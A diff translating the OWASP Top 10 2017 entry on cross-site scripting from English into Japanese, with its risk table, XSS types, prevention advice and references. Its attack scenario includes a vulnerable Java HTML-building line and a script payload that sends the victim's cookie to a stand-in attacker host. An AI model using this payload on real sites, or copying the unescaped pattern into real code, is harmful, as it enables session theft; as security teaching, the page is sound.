@@ -1,43 +1,45 @@
-# A7:2017 Cross-Site Scripting (XSS)
+# A7:2017 クロスサイトスクリプティング (XSS)
 
-| Threat agents/Attack vectors | Security Weakness           | Impacts               |
+| 脅威エージェント/攻撃手法 | セキュリティ上の弱点           | 影響               |
 | -- | -- | -- |
-| Access Lvl : Exploitability 3 | Prevalence 3 : Detectability 3 | Technical 2 : Business |
-| Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks. | XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications. Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET. | The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim. |
+| Access Lvl : 悪用難易度 3 | 流行度 3 : 検出難易度 3 | 技術的影響 2 : ビジネスへの影響 |
+| 3種類のXSSはいずれも、自動化ツールを用いて検出および悪用することが可能です。また、誰でも入手できる、XSSを悪用するためのフレームワークも複数存在します。 | XSSは、OWASP Top 10の中では2番目に多く見られる問題であり、アプリケーション全体のおよそ三分の二で検出されます。
 
-## Is the Application Vulnerable?
+自動化ツールで、いくつかのXSS問題を検出できます。PHP、J2EE/JSP、またはASP.NETのような成熟した技術においては、特にそれが顕著です。 | XSSの影響は、リクレクトおよびDOMベースの場合は中程度、ストアドの場合は重大となります。具体的な被害例として、被害者のブラウザ上でリモートコードが実行されることによる、認証情報やセッションの奪取、被害者へのマルウェア感染が挙げられます。 |
 
-There are three forms of XSS, usually targeting users' browsers:
+## 脆弱性有無の確認
 
-* **Reflected XSS**: The application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.
-* **Stored XSS**: The application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered a high or critical risk.
-* **DOM XSS**: JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, the application would not send attacker-controllable data to unsafe JavaScript APIs.
+XSSには3種類のタイプが存在し、大抵は被害者のブラウザがターゲットとされます。
 
-Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM node replacement or defacement (such as trojan login panels), attacks against the user's browser such as malicious software downloads, key logging, and other client-side attacks.
+* **リフレクトXSS**: アプリケーションまたはAPIが、ユーザ入力データを適切に検証およびエスケープせずに、HTML出力の一部としてインクルードしている場合に脆弱になります。攻撃が成功すると、攻撃者は被害者のブラウザで任意のHTMLやJavaScriptを実行できるようになります。一般的には、水飲み場サイトや広告ページなど、攻撃者の制御下にあるページに辿り着くための何らかの悪質なリンクに対して、ユーザが操作を行う必要があります。
+* **ストアドXSS**: ユーザ入力データが後に別のユーザまたは管理者によって閲覧される場合において、アプリケーションまたはAPIがそのデータを無害化せずに格納していると脆弱になります。ストアドXSSは、大抵の場合、高または重大リスクと見做されています。
+* **DOMベースXSS**: 攻撃者が制御可能なデータをページに動的にインクルードするJavaScriptフレームワーク、単一ページのアプリケーション、およびAPIは、DOMベースXSSに対して脆弱になります。アプリケーションは、安全でないJavaScript APIに対して、攻撃者が制御可能なデータを送信しないことが理想です。
 
-## How To Prevent
+典型的なXSS攻撃には、セッションの奪取、アカウントの乗っ取り、多要素認証(MFA)の回避、DOMノードの置換または改竄(トロイの木馬を介した偽のログイン画面挿入等)、悪質なソフトウェアのダウンロードやキーロギング等のユーザのブラウザに対する攻撃などが含まれます。
 
-Preventing XSS requires separation of untrusted data from active browser content. This can be achieved by:
+## 防止方法
 
-* Using frameworks that automatically escape XSS by design, such as the latest Ruby on Rails, React JS. Learn the limitations of each framework's XSS protection and appropriately handle the use cases which are not covered.
-* Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) has details on the required data escaping techniques.
-* Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP Cheat Sheet 'DOM based XSS Prevention'.
-* Enabling a [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) as a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).
+XSSを防止するには、信頼出来ないデータを動的なブラウザコンテンツから区別する必要があります。具体的には以下を実施します。
 
-## Example Attack Scenario
+* 最新のRuby on RailsやReact JSなど、XSSに悪用されうるデータを自動的にエスケープするよう設計されたフレームワークを使用する。各フレームワークにおけるXSS対策の限界を確認し、対策の範囲外となるデータ使用については、適切な処理を行う。
+* ボディ、属性、JavaScript、CSSやURLなどHTML出力のコンテキストに基づいて、信頼出来ないHTTPリクエストデータをエスケープすることで、リフレクトおよびストアドXSS脆弱性を解消できる。要求されるデータの詳細なエスケープ手法は [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) を参照のこと。
+* クライアント側でのブラウザドキュメント改変時に、コンテキスト依存のエンコーディングを適用することで、DOMベースXSSへの対策となる。これが行えない場合には、OWASP Cheat Sheet 'DOM based XSS Prevention'で説明されている、同様のコンテキスト依存のエスケープ手法をブラウザAPIに適用することもできる。
+* XSSに対する多層防御措置の一環として [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) を有効に設定する。これは、ローカルファイルインクルードを介して悪意のあるコードを設置可能にする他の脆弱性（例：パストラバーサルを悪用したファイルの上書き、許可されたコンテンツ配信ネットワークから提供された脆弱なライブラリ等）が存在しない場合に効果的である。
 
-**Scenario #1**: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
+## 攻撃シナリオの例
+
+**シナリオ #1**: あるアプリケーションは、検証やエスケープをせず、信頼出来ないデータを使用して、以下のHTMLスニペットを生成しています。
 
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
-The attacker modifies the ‘CC’ parameter in the browser to:
+攻撃者はブラウザでパラメータ‘CC’を以下に改変します。
 
 `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
-This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
+これにより、被害者のセッションIDが攻撃者のウェブサイトに送信され、被害者のセッションが乗っ取られます。
 
-**Note**: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.
+攻撃者は、アプリケーションが使用している自動化されたCSRF対策を、XSSで破れることに注意して下さい。
 
-## References
+## 参考資料
 
 ### OWASP
 
@@ -52,7 +54,7 @@ This attack causes the victim’s session ID to be sent to the attacker’s webs
 * [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 * [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)
 
-### External
+### その他
 
 * [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
 * [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
